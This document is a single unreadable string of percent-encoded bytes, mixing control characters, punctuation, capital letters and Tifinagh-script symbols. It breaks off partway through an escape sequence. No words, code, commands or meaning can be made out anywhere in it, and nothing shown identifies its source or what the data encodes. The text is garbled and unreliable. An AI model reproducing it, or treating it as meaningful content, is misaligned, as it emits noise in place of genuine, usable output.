9PWQAXAL%0A%E2%B5%93%E2%B4%AC%E2%B5%92%E2%B4%A9GU%E2%B5%85%E2%B5%8A%E2%B5%9F%E2%B4%BEZ%0D%0E%1A%12%10%0A%5C%02%11%1F%0DWYQ%1FS@%5C%5DOTQ%08S@%5CXDGH%5D%E2%B4%B3%E2%B5%85%E2%B5%9B%E2%B4%B1J%E2%B4%A3%E2%B4%A4%E2%B4%BB%E2%B4%B9NQC,*J%3C:%5BMC,,%3CL:%5B75*,J%3C%3C-7C,,%3C%3CJQG3*,%3CXI@%03%5EGASWPUZ%5DBGVN%5BX%5C%07CAQVVEIX%0F@QWS3ES%15%03%04%06%0AK%0F%09%04%14AOPC%5DYCIDW%0EB%5CXGBPN%5B%E2%B4%A2%E2%B5%99%E2%B5%9F%E2%B4%AELIQY@Y%5EZA%0EUQDZ_CXZ%E2%B4%B5%E2%B4%A4%E2%B4%AC%E2%B4%B4EZJ%03%15%04%11%07S%0A%0C%1C%15%04%04%19%1A%19Q%E2%B5%93%E2%B4%AC%E2%B5%92%E2%B4%A9W%15%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B5%91%E2%B5%97%E2%B4%B8XE%13%05%14%15%12%13%1EL@%E2%B5%85%E2%B4%BA%E2%B4%B2%E2%B4%AAIYEC,,%1C%01%14%1E%0F%1C%1E%1E%0FG%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%B1_X%1A%15%04%04%19%1A%19Q%E2%B5%93%E2%B4%AC%E2%B4%B2%E2%B4%A1DA%5C%E2%B4%A3%E2%B4%B4%E2%B4%A6%E2%B4%AAXE%15%11%04%0F%04%15%19%03%06W%E2%B4%A3%E2%B4%B4%E2%B5%96%E2%B4%BBXE%13%05%14%15%12%13%1EL@%5CPJ%3C%3C%5BMC,,HMI%5BG3%5C*%3C::%5B75*ZILJ+G3*,:L:-1AZZ@L:-EC_ZJ%3CJ+15,Z::%3C%5BDC%5C*J%3C%3C-7C,,%3CNH%0D%1A%09%05Q%E2%B4%B3%E2%B5%92%E2%B4%B6%E2%B4%A9Q3_A%0EVQ@%5DXD@DW%19A%5CXB7HKI@%14YFBP&L@%03ZF@PQVY@@G%1EPWQA%5D%5B@TWRWDZA%5BYQ%1FR@%5D%5B@TQ%08S@%5CXBGHKIA_YBFVBQ%1F%5EXGCUTH%5CDX%18GQVRCYMADVUQY1S%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B4%B1%E2%B4%BD%E2%B4%B8XE%13%05%14%15%12%13%1EL@_ZI%3CJ+7I%5C*%3CL@%5B75*Z:L:-15*Z::H+G3*,HMI%E2%B4%A2%E2%B4%A9%E2%B4%A4%E2%B4%A2YHNH%5BDC%5C*J%3C%3C-7C,,%3CLI%5BG3%5C*%3C::%5B75*XLL@%5B75%5E%0C%07%12%0F%13%18%01%18%1FA%E2%B4%A5%E2%B5%91%E2%B4%A0%E2%B4%B5@%5E%0A%13%02%15%05%1E%06W%E2%B5%83%E2%B4%AA%E2%B5%94%E2%B4%AEXEC%E2%B5%85%E2%B5%8A%E2%B4%BF%E2%B4%B6IYG%E2%B4%AA%E2%B5%87%E2%B4%A1%E2%B4%B0OH%5B%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B5%82%E2%B4%A7%E2%B4%BB%E2%B4%A6YHL%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%B9_XJ%E2%B5%95%E2%B4%BA%E2%B4%B8%E2%B4%BD@%5EZ%E2%B5%93%E2%B5%9C%E2%B4%BF%E2%B4%A1DA%5C%E2%B4%A3%E2%B4%A4%E2%B5%9B%E2%B4%ADXE%15%11%04%0F%04%15%19%03%06W%E2%B5%83%E2%B4%AA%E2%B4%B4%E2%B4%B8XE%13%05%14%15%12%13%1EL%1C%1F%18%12%3CI%E2%B4%A2%E2%B4%B9%E2%B5%99%E2%B4%A1YHNJX%E2%B4%AE%E2%B5%98%E2%B4%A7%E2%B4%A6INH-W%15%01%10%13G%E2%B5%93%E2%B4%AB%E2%B4%A4%E2%B4%B1J*IW%19B%5CYCHDW%0EB%5CXFEQNMX%5C%07CAQSVAI%5EBGSTH%5CDX%18CUWQ@ZEO@VPVY1S%11%04%0F%04%15%19%03%06W%E2%B4%A3%E2%B4%A4%E2%B4%AB%E2%B4%B8XE%13%05%14%15%12%13%1EL%E2%B4%AA%E2%B5%87%E2%B4%A1%E2%B4%A8OH%5B%E2%B5%9E%E2%B5%93%E2%B5%89%E2%B4%B8INJ%E2%B5%82%E2%B5%97%E2%B4%B6%E2%B4%A6YHL%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%A3_XJ%E2%B4%B5%E2%B4%B4%E2%B4%A1%E2%B4%A2@%5EZ%E2%B5%93%E2%B4%BC%E2%B5%99%E2%B4%B8DA%5C%E2%B4%B3%E2%B5%91%E2%B5%97%E2%B4%B6XEC%E2%B5%85%E2%B5%8A%E2%B4%BF%E2%B4%ACIY%11%0E%02%1F%02%13%08%1F%02H%E2%B4%B5%E2%B4%A1%E2%B4%AB%E2%B4%BDIY%17%1A%12%05%14%15%0FPD%E2%B4%BA%E2%B4%A2%E2%B4%A0%E2%B4%B7OHY7%E2%B4%AA%E2%B5%87%E2%B4%B1%E2%B4%B9OH-D%E2%B4%BA%E2%B4%A2%E2%B4%B0%E2%B4%B6OHY%11%0E%02%1F%02%13%08%1F%02H%E2%B5%85%E2%B5%8A%E2%B4%AF%E2%B4%BDIY%17%1A%12%05%14%15%0FPD@%5CY:L:+MC,,JFJ+15%5C*J%3C%3C-15%5C*%3CN:%5B73%5C*:L:-1C,Z::%3C-G3*,:L:-13%5CPJ%3C%3C-15%5E%5BI%E2%B4%A5%E2%B4%B1%E2%B4%AA%E2%B4%BF@%5EXHLI%5B73%5C*:L:-1C,Z::%3C-G3*,:L:-13%5C*%3C:%3CY%11%0E%02%1F%02%13%08%1F%02H%E2%B5%85%E2%B4%BA%E2%B4%A2%E2%B4%BDIY%17%1A%12%05%14%15%0FP%E2%B4%BE%E2%B5%9D%E2%B4%B0%E2%B4%ABINJ%E2%B4%A2%E2%B5%99%E2%B4%BF%E2%B4%BEYHL%E2%B4%A3%E2%B4%B0%E2%B5%99%E2%B4%A4_XJ%E2%B4%A5%E2%B4%B1%E2%B5%8A%E2%B4%A3@%5E%0C%09%0E,3B%1B:B(Z%07%05%02%0B%03%18%0E%09IY%17%1A%12%05%14%15%0FPDX8CWSRE__BFD_H%0DW%0E%02%1F%02%13%08%1F%02H%E2%B4%A5%E2%B5%84%E2%B4%A6%E2%B4%BDIY%17%1A%12%05%14%15%0FPD%E2%B4%AA%E2%B4%B7%E2%B5%84%E2%B4%AFOHY7%E2%B5%9A%E2%B4%AC%E2%B4%A9%E2%B4%A9OH-DA%0A%1
